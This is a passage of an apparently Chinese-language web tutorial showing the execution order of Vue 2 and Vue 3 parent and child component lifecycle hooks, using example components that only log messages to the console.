    <span class="hljs-comment">&lt;!-- &lt;h3&gt;子组件 - {{ childData }}&lt;/h3&gt; --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>子组件<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">props</span>: [<span class="hljs-string">'childData'</span>],
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. 子组件 beforeUpdate'</span>)
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. 子组件 updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
</code></pre>
<h4 data-id="heading-12">更新子组件</h4>
<h5 data-id="heading-13">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 更新过程（数据变化时）</span>
​
子组件 beforeUpdate
​
子组件 updated
</code></pre>
<h5 data-id="heading-14">代码示例：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件 - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>改变数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/two/Child.vue'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">parentData</span>: <span class="hljs-string">'初始值'</span>
    }
  },
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">changeData</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentData</span> = <span class="hljs-string">'新值'</span>
    }
  },
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 父组件 beforeUpdate'</span>)
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 父组件 updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc; padding: 10px; margin: 10px;"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Child Component - {{ childMessage }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeChildData"</span>&gt;</span>改变子组件数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>计数: {{ count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
​
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">childMessage</span>: <span class="hljs-string">'子组件初始数据'</span>,
      <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
    }
  },
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">changeChildData</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">childMessage</span> = <span class="hljs-string">'子组件数据已更新'</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'=== 子组件数据变化触发 ==='</span>)
    }
  },
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child beforeUpdate'</span>) },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child updated'</span>) },
​
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
​
</code></pre>
<h3 data-id="heading-15">3. 组件销毁阶段（Destroying）</h3>
<h4 data-id="heading-16">销毁父组件</h4>
<h5 data-id="heading-17">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 销毁过程</span>
​
父组件 beforeDestroy
​
  子组件 beforeDestroy
​
  子组件 destroyed
​
父组件 destroyed
</code></pre>
<h5 data-id="heading-18">代码示例：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"showChild"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"showChild = false"</span>&gt;</span>销毁子组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/two/Child.vue'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">showChild</span>: <span class="hljs-literal">true</span>
    }
  },
  <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父组件 beforeDestroy'</span>)
  },
  <span class="hljs-title function_">destroyed</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父组件 destroyed'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
</code></pre>
<h4 data-id="heading-19">销毁子组件</h4>
<h5 data-id="heading-20">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 销毁过程</span>
​
 子组件 beforeDestroy
​
 子组件 destroyed
​
</code></pre>
<h5 data-id="heading-21">代码示例：见销毁父组件的代码</h5>
<h2 data-id="heading-22">vue3版本</h2>
<blockquote>
<p>生命周期：</p>
<p>setup（）替代 beforeCreate setup（）替代 created onBeforeMount onMounted onBeforeUpdate onUpdated onBeforeUnmount onUnmounted onActivated onDeactivated onRenderTracked（新增） onRenderTriggered（新增）</p>
</blockquote>
<h3 data-id="heading-23">1. 组件挂载阶段（Mounting）</h3>
<h4 data-id="heading-24">执行顺序：</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 父组件 setup (相当于 beforeCreate + created)
<span class="hljs-bullet">2.</span> 父组件 onBeforeMount
<span class="hljs-bullet">    3.</span> 子组件 setup
<span class="hljs-code">    3.1 子组件 onBeforeMount
    4. 子组件 onMounted
5. 父组件 onMounted
</span></code></pre>
<h4 data-id="heading-25">代码示例：</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeMount, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 父组件 setup (相当于 beforeCreate + created)'</span>)
<span class="hljs-title function_">onBeforeMount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. 父组件 onBeforeMount'</span>)
})
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5. 父组件 onMounted'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>子组件<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeMount, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. 子组件 setup'</span>)
<span class="hljs-title function_">onBeforeMount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3.1 子组件 onBeforeMount'</span>)
})
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 子组件 onMounted'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
</code></pre>
<h3 data-id="heading-26">2. 组件更新阶段（Updating）</h3>
<h4 data-id="heading-27">总结：</h4>
<blockquote>
<p>vue3中，只要父组件往子组件传入了值，当该值更新时，子组件的更新生命周期就会执行，其他情况，子组件的更新生命周期都不会执行</p>
</blockquote>
<h4 data-id="heading-28">更新父组件--子组件使用了，父组件传入的参数</h4>
<h5 data-id="heading-29">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 更新过程（数据变化时）</span>
​
父组件 beforeUpdate
​
  子组件 beforeUpdate
​
  子组件 updated
​
父组件 updated
</code></pre>
<h5 data-id="heading-30">代码示例：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件 - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>改变数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onBeforeUpdate, onUpdated } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-keyword">const</span> parentData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'初始值'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeData</span> = (<span class="hljs-params"/>) =&gt; {
  parentData.<span class="hljs-property">value</span> = <span class="hljs-string">'新值'</span>
}
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 父组件 onBeforeUpdate'</span>)
})
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 父组件 onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>子组件 - {{ props.childData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeUpdate, onUpdated, defineProps } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
​
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>([<span class="hljs-string">'childData'</span>])
​
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. 子组件 onBeforeUpdate'</span>)
})
​
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. 子组件 onUpdated'</span>)
})
​
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
</code></pre>
<h4 data-id="heading-31">更新父组件--父组件传值给子组件，即使子组件没有使用 和 定义对应的属性</h4>
<blockquote>
<p>如果父组件没有传值给子组件，即使子组件定义 和 使用了值，当父组件更新时，子组件也不会更新，即：生命周期是：</p>
<p><code>父组件 beforeUpdate</code> -&gt; <code>父组件 updated</code></p>
</blockquote>
<h5 data-id="heading-32">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 更新过程（数据变化时）</span>
​
父组件 beforeUpdate
​
  子组件 beforeUpdate
​
  子组件 updated
​
父组件 updated
</code></pre>
<h5 data-id="heading-33">代码示例：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件 - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>改变数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;ChildComponent  /&gt; --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onBeforeUpdate, onUpdated } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-keyword">const</span> parentData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'初始值'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeData</span> = (<span class="hljs-params"/>) =&gt; {
  parentData.<span class="hljs-property">value</span> = <span class="hljs-string">'新值'</span>
}
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 父组件 onBeforeUpdate'</span>)
})
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 父组件 onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>子组件<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;h3&gt;子组件 - {{ props.childData }}&lt;/h3&gt; --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeUpdate, onUpdated, defineProps } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
​
<span class="hljs-comment">// const props = defineProps(['childData'])</span>
​
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. 子组件 onBeforeUpdate'</span>)
})
​
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. 子组件 onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
</code></pre>
<h4 data-id="heading-34">更新子组件</h4>
<h5 data-id="heading-35">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 更新过程（数据变化时）</span>
​
子组件 beforeUpdate
​
子组件 updated
</code></pre>
<h5 data-id="heading-36">代码示例：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;h2&gt;父组件 - {{ parentData }}&lt;/h2&gt; --&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;button @click="changeData"&gt;改变数据&lt;/button&gt; --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;ChildComponent  /&gt; --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onBeforeUpdate, onUpdated } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-keyword">const</span> parentData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'初始值'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeData</span> = (<span class="hljs-params"/>) =&gt; {
  parentData.<span class="hljs-property">value</span> = <span class="hljs-string">'新值'</span>
}
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 父组件 onBeforeUpdate'</span>)
})
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 父组件 onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;h3&gt;子组件&lt;/h3&gt; --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>子组件 - {{ sonData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>改变数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeUpdate, onUpdated,ref, defineProps } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
​
<span class="hljs-comment">// const props = defineProps(['childData'])</span>
​
<span class="hljs-keyword">const</span> sonData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'初始值'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeData</span> = (<span class="hljs-params"/>) =&gt; {
  sonData.<span class="hljs-property">value</span> = <span class="hljs-string">'新值'</span>
}
​
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. 子组件 onBeforeUpdate'</span>)
})
​
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. 子组件 onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
</code></pre>
<h3 data-id="heading-37">3. 组件销毁阶段（Destroying）</h3>
<h4 data-id="heading-38">销毁父组件</h4>
<h5 data-id="heading-39">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 销毁过程</span>
​
父组件 beforeDestroy
​
  子组件 beforeDestroy
​
  子组件 destroyed
​
父组件 destroyed
</code></pre>
<h5 data-id="heading-40">代码示例：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"showChild"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"showChild = false"</span>&gt;</span>卸载子组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onBeforeUnmount, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-keyword">const</span> showChild = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">true</span>)
<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父组件 onBeforeUnmount'</span>)
})
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父组件 onUnmounted'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;h3&gt;子组件&lt;/h3&gt; --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>子组件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeUnmount, onUnmounted,ref, defineProps } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
​
